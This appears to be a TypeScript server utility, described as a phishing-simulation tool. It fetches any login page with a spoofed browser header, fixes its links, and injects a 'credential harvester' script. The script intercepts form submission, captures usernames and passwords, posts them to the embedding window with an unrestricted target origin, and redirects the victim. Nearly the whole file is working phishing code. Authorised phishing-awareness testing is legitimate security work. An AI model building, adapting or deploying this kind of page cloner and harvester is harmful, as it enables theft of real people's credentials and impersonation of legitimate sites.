'use server';
/**
 * @fileOverview A server-side utility for cloning a web page for phishing simulations.
 *
 * - cloneLoginPage - Fetches a URL's HTML, injects a credential harvester script, and returns the modified content.
 * - PageClonerInput - The input type for the cloneLoginPage function.
 * - PageClonerOutput - The return type for the cloneLoginPage function.
 */

import {z} from 'zod';

const PageClonerInputSchema = z.object({
  targetUrl: z.string().url('A valid target URL is required.'),
  redirectUrl: z.string().url('A valid URL to redirect to after submission is required.'),
});
export type PageClonerInput = z.infer<typeof PageClonerInputSchema>;

const PageClonerOutputSchema = z.object({
  htmlContent: z.string().describe('The full HTML content of the generated login page.'),
});
export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;


const getHarvesterScript = (redirectUrl: string) => `
<script>
  // Wait for the DOM to be fully loaded
  document.addEventListener('DOMContentLoaded', (event) => {
    // Find all forms on the page
    const forms = document.querySelectorAll('form');

    forms.forEach(form => {
      // Look for a password field within the form
      const passwordInput = form.querySelector('input[type="password"]');
      
      if (passwordInput) {
        // We found a likely login form, let's attach our harvester
        form.addEventListener('submit', function(e) {
          e.preventDefault(); // Prevent the form from submitting normally

          // Find username/email and password fields
          let username = '';
          let password = '';

          // Common names/ids for username fields
          const usernameSelectors = [
            'input[type="email"]',
            'input[name*="user"]',
            'input[name*="login"]',
            'input[id*="user"]',
            'input[id*="login"]',
            'input[type="text"]' // Fallback
          ];
          
          for(const selector of usernameSelectors) {
              const usernameField = form.querySelector(selector);
              if (usernameField) {
                  username = usernameField.value;
                  break;
              }
          }
          
          password = passwordInput.value;

          // Send the captured data to the parent window (our app)
          window.parent.postMessage({ 
            type: 'credential-capture', 
            username: username, 
            password: password 
          }, '*');

          // Redirect the user to the specified URL
          setTimeout(() => {
            window.location.href = '${redirectUrl}';
          }, 500);
        });
      }
    });
  });
</script>
`;


export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
  const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch the target URL. Status: ${response.status}`);
    }

    let html = await response.text();

    // 1. Inject <base> tag to fix relative links for CSS, images, etc.
    const url = new URL(targetUrl);
    const baseTag = `<base href="${url.origin}">`;
    html = html.replace(/(<head[^>]*>)/, `$1${baseTag}`);

    // 2. Inject the credential harvester script before the closing body tag
    const script = getHarvesterScript(redirectUrl);
    html = html.replace(/<\/body>/, `${script}</body>`);

    return {
      htmlContent: html,
    };
  } catch (error) {
    console.error('Error cloning page:', error);
    if (error instanceof Error) {
        throw new Error(`Failed to clone page: ${error.message}`);
    }
    throw new Error('An unknown error occurred during page cloning.');
  }
}
